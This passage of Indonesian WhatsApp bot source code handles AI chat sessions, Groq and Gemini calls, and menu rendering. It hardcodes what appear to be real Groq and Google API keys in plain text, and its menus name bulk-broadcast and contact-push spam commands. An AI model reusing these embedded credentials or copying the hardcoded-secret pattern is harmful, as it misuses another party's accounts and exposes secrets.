  if (!sessionDb[m.sender]) {
    sessionDb[m.sender] = {
      activeSession: 'default',
      sessions: {
        default: { name: 'Default', createdAt: Date.now(), history: [] }
      }
    }
    saveSession(sessionDb)
  }

  const sub = args[0]?.toLowerCase()
  const param = args.slice(1).join(' ').trim()

  if (!sub) {
    const userData = sessionDb[m.sender]
    const active = userData.activeSession
    const sessionList = Object.entries(userData.sessions)
      .map(([id, s]) => `${id === active ? '✅' : '○'} *${id}* — ${s.name} (${s.history.length / 2 | 0} pesan)`)
      .join('\n')
    return m.reply(
      `╔══ 🤖 *SESSION AI* ══╗\n` +
      `║ User: ${m.sender.split('@')[0]}\n` +
      `║ Aktif: *${active}*\n` +
      `╚══════════════════╝\n\n` +
      `*Daftar Session:*\n${sessionList}\n\n` +
      `*Command:*\n` +
      `• \`.sessionai baru <nama>\` — buat session baru\n` +
      `• \`.sessionai pakai <id>\` — ganti session aktif\n` +
      `• \`.sessionai hapus <id>\` — hapus session\n` +
      `• \`.sessionai reset\` — hapus history session aktif\n` +
      `• \`.sessionai info\` — detail session aktif\n` +
      `• \`.sessionai list\` — daftar semua session`
    )
  }

  if (sub === 'baru' || sub === 'new' || sub === 'create') {
    if (!param) return m.reply('Contoh: `.sessionai baru Belajar Coding`')
    const newId = param.toLowerCase().replace(/\s+/g, '_').replace(/[^a-z0-9_]/g, '').slice(0, 20) + '_' + Date.now().toString().slice(-4)
    if (sessionDb[m.sender].sessions[newId]) return m.reply(`Session *${newId}* sudah ada.`)

    sessionDb[m.sender].sessions[newId] = {
      name: param.slice(0, 50),
      createdAt: Date.now(),
      history: []
    }
    sessionDb[m.sender].activeSession = newId
    saveSession(sessionDb)

    return m.reply(
      `✅ *Session baru dibuat & diaktifkan!*\n\n` +
      `ID: \`${newId}\`\n` +
      `Nama: ${param}\n` +
      `Owner: ${m.sender.split('@')[0]}\n\n` +
      `AI akan mulai dari awal di session ini. Kirim pesan apa saja untuk mulai!`
    )
  }

  if (sub === 'pakai' || sub === 'switch' || sub === 'use') {
    if (!param) return m.reply('Contoh: `.sessionai pakai default`')
    const targetId = param.toLowerCase()
    if (!sessionDb[m.sender].sessions[targetId]) {
      const available = Object.keys(sessionDb[m.sender].sessions).join(', ')
      return m.reply(`❌ Session *${targetId}* tidak ditemukan.\nYang tersedia: ${available}`)
    }
    sessionDb[m.sender].activeSession = targetId
    saveSession(sessionDb)
    const sess = sessionDb[m.sender].sessions[targetId]
    return m.reply(
      `🔄 *Session diganti!*\n\n` +
      `Aktif: *${targetId}*\n` +
      `Nama: ${sess.name}\n` +
      `History: ${sess.history.length / 2 | 0} pesan tersimpan`
    )
  }

  if (sub === 'hapus' || sub === 'delete' || sub === 'del') {
    if (!param) return m.reply('Contoh: `.sessionai hapus <id>`')
    const targetId = param.toLowerCase()
    if (targetId === 'default') return m.reply('❌ Session *default* tidak bisa dihapus.')
    if (!sessionDb[m.sender].sessions[targetId]) return m.reply(`❌ Session *${targetId}* tidak ditemukan.`)

    delete sessionDb[m.sender].sessions[targetId]
    if (sessionDb[m.sender].activeSession === targetId) {
      sessionDb[m.sender].activeSession = 'default'
    }
    saveSession(sessionDb)
    return m.reply(`🗑️ Session *${targetId}* berhasil dihapus.\nSekarang aktif: *${sessionDb[m.sender].activeSession}*`)
  }

  if (sub === 'reset' || sub === 'clear') {
    const active = sessionDb[m.sender].activeSession
    sessionDb[m.sender].sessions[active].history = []
    saveSession(sessionDb)
    return m.reply(`🔁 History session *${active}* berhasil direset!\nAI dimulai dari awal.`)
  }

  if (sub === 'info') {
    const active = sessionDb[m.sender].activeSession
    const sess = sessionDb[m.sender].sessions[active]
    const created = new Date(sess.createdAt).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })
    const msgCount = sess.history.length / 2 | 0
    return m.reply(
      `📊 *Info Session Aktif*\n\n` +
      `ID: \`${active}\`\n` +
      `Nama: ${sess.name}\n` +
      `Owner: ${m.sender.split('@')[0]}\n` +
      `Dibuat: ${created}\n` +
      `Pesan tersimpan: ${msgCount} percakapan\n` +
      `Total token estimasi: ~${sess.history.reduce((a, h) => a + (h.content?.length || 0), 0)} chars`
    )
  }

  if (sub === 'list') {
    const userData = sessionDb[m.sender]
    const active = userData.activeSession
    const list = Object.entries(userData.sessions)
      .map(([id, s], i) => {
        const tgl = new Date(s.createdAt).toLocaleDateString('id-ID')
        return `${i + 1}. ${id === active ? '✅' : '○'} \`${id}\`\n   📌 ${s.name}\n   🗓 ${tgl} | 💬 ${s.history.length / 2 | 0} pesan`
      }).join('\n\n')
    return m.reply(`📋 *Semua Session — ${m.sender.split('@')[0]}*\n\n${list}`)
  }

  return m.reply(`Sub-command tidak dikenal. Ketik \`.sessionai\` untuk bantuan.`)
}
break

case 'buatcatatan': {
  if (!text) return reply('Contoh: .buatcatatan materi python')
  try {
    const res = await axios.post('https://api.groq.com/openai/v1/chat/completions', {
      model: 'llama-3.3-70b-versatile',
      messages: [{ role: 'user', content: text }]
    }, { headers: { Authorization: `Bearer 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` } })
    const hasil = res.data.choices[0].message.content

    if (!fs.existsSync('./Tmp')) fs.mkdirSync('./Tmp', { recursive: true })
    const filePath = `./Tmp/catatan_${m.sender.split('@')[0]}.txt`
    fs.writeFileSync(filePath, hasil)

    await NXL.sendMessage(from, {
      document: fs.readFileSync(filePath),
      mimetype: 'text/plain',
      fileName: 'catatan.txt',
      caption: '📄 Catatan lo udah jadi!'
    }, { quoted: m })

    fs.unlinkSync(filePath)
  } catch (err) {
    reply('Gagal: ' + err.message)
  }
}
break

case "gemini": {
  if (!text) return reply(`contoh .${command} halo`)

  const { GoogleGenAI } = require("@google/genai")
  const apikey = "AIzaSyC-bHKyLeYQVt1LG2frmHOoVr2cF5yfe8s"
  const ai = new GoogleGenAI({ apiKey: apikey })

  const web = await ai.models.generateContent({
    model: "gemini-2.0-flash",
    contents: text,
    config: {
      systemInstruction: "kamu adalah ai XresXDigital"
    }
  })

  const hasil = web.text
  reply(`${hasil}`)
  break
}
case "gpt": {
  if (!text) return reply(`contoh .${command} halo`)
  const apikey = "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"
  const web = await axios.post("https://api.groq.com/openai/v1/chat/completions", {
    model: "openai/gpt-oss-20b",
    messages: [{ role: 'user', content: text }]
  }, { headers: { Authorization: `Bearer ${apikey}` } })
  const promt = "kamu adalah ai XresXDigital"
  const output = web.data.choices[0].message.content || "data tidak ditemukan"
  reply(`${output}`)
}
break

case "menu": {
  wek = `BAGAIMANA CARA MENDAPATKAN DIA :(`

  const createlink = {
    key: {
      participant: `0@s.whatsapp.net`,
      remoteJid: "status@broadcast"
    },
    message: {
      extendedTextMessage: {
        text: `*${ownername} 2.0*`,
        contextInfo: {
          externalAdReply: {
            title: "${ownername} Developer",
            body: "Tap untuk buka link",
            sourceUrl: "https://wa.me/6287728163189",
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true
          }
        }
      }
    }
  }

const menuRows = [
  ['semua menu',       'Lihat semua fitur bot',   '.allmenu'],
  ['owner menu',     'Khusus pemilik bot',       '.ownermenu'],
]

let sections = [
  {
    title: 'List Menu',
    highlight_label: 'allmenu',
    rows: menuRows.map(([title, description, id]) => ({ title, description, id }))
  }
]

let listMessage = { title: 'List Menu', sections }

  let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            mentionedJid: [m.sender],
            isForwarded: false,
            forwardedNewsletterMessageInfo: {
              newsletterJid: global.idsal,
              newsletterName: wm,
              serverMessageId: -1
            },
            businessMessageForwardInfo: {
              businessOwnerJid: NXL.decodeJid(NXL.user.id)
            },
            quotedMessage: createlink.message,
            remoteJid: createlink.key.remoteJid,
            participant: createlink.key.participant,
          },
          body: proto.Message.InteractiveMessage.Body.create({
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
           text: Styles(`simple whatsapp bot made by ${ownername}`)
           }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: `╔═❏ *${global.namabot}*
║ Versi: ${global.versibot}
║ Mode: ${botMode.toUpperCase()}
║ Owner: ${owner}
║ Dev: ${global.ownername}
╚═❏

  ╭◙  *Other Menu*
  ┆• .pushkontak
  ┆• .jedapush
  ┆• .jedajpm
  ┆• .jpm
  ┆• .bljpm
  ┆• .listbljpm
  ┆• .delbljpm
  ┆• .cekidch
  ╰◙͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
  ╭◙  *Main Menu*
  ┆• .igdownload
  ┆• .removebg
  ┆• .suarateks
  ┆• .emojimix
  ┆• .pinterest
  ┆• .ttsearch
  ┆• .gimage
  ┆• .bratvid
  ┆• .ssweb
  ┆• .ffstalk
  ┆• .tiktok
  ┆• .brat
  ┆• .sfile
  ┆• .play
  ╰◙
  ╭◙  *Tools Media*
  ┆• .tourl
  ╰◙
  ╭◙ 𝗔𝘂𝘁𝗼 𝗠𝗲𝗻𝘂
  ┆• .autojpmswgc
  ┆• .setautoswgc
  ┆• .autojpm
  ┆• .setjpm
  ┆• .autojoingc
  ╰◙
  ╭◙ 𝗝𝗣𝗠 𝗠𝗲𝗻𝘂
  ┆•.jaser
  ┆• .jaserht
  ┆• .jedajaser
  ┆•.jpmswgc
  ┆• .listproduk
  ┆• .addproduk
  ┆• .autopromo
  ┆• .setpromo
  ┆• .payment
  ╰◙
  ╭◙  *Group Menu*
  ┆• .creategc
  ┆• .leavegc
  ┆• .joingc
  ┆• .listgrup
  ┆• .notifgrup
  ┆• .status grup
  ┆• .antilink
  ┆• .welcome
  ┆• .hidetag
  ┆• .kick
  ┆• .add
  ┆• .mute
  ┆• .unmute
  ┆• .muteinfo
  ┆• .warn
  ┆• .warnlist
  ┆• .resetwarn
  ┆• .notifgrup
  ╰◙
  ╭◙  *Owner Menu*
  ┆• .addowner <nomor>
  ┆• .delowner <nomor>
  ┆• .listowner
  ┆• .restart
  ┆• .public
  ┆• .self
  ┆• .backup
  ╰◙
  ╭◙  *Ai Menu*
  ┆• .nxlai on/off
  ┆• .sessionai
  ┆• .imagine
  ┆• .gpt
  ╰◙
`,

            hasMediaAttachment: true,
            ...(global._menuMediaCache || (global._menuMediaCache = await prepareWAMessageMedia(
              { image: fs.readFileSync(`./lib/image/image.jpg`), gifPlayback: true },
              { upload: NXL.waUploadToServer }
            ).catch(() => { global._menuMediaCache = null; return {} })))
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
               {
 "name": "cta_url",
  "buttonParamsJson": `{\"display_text\":\"owner\",\"url\":\"https://wa.me/${owner}\",\"merchant_url\":\"https://wa.me/${owner}\"}`
   }
            ]
          })
        })
      }
    }
  }, {})

  await NXL.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  })
}
break

case "allmenu": {
  await NXL.sendMessage(m.chat, {
    image: global.gambar1Cache || fs.readFileSync(`./lib/image/image.jpg`),
    caption: `╔═❏ *${global.namabot}*
║ Versi: ${global.versibot}
║ Mode: ${botMode.toUpperCase()}
║ Owner: ${owner}
║ Dev: ${global.ownername}
╚═❏

  ╭◙  *Other Menu*
  ┆• .pushkontak
  ┆• .jedapush
  ┆• .jedajpm
  ┆• .jpm
  ┆• .bljpm
  ┆• .listbljpm
  ┆• .delbljpm
  ┆• .cekidch
  ╰◙͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏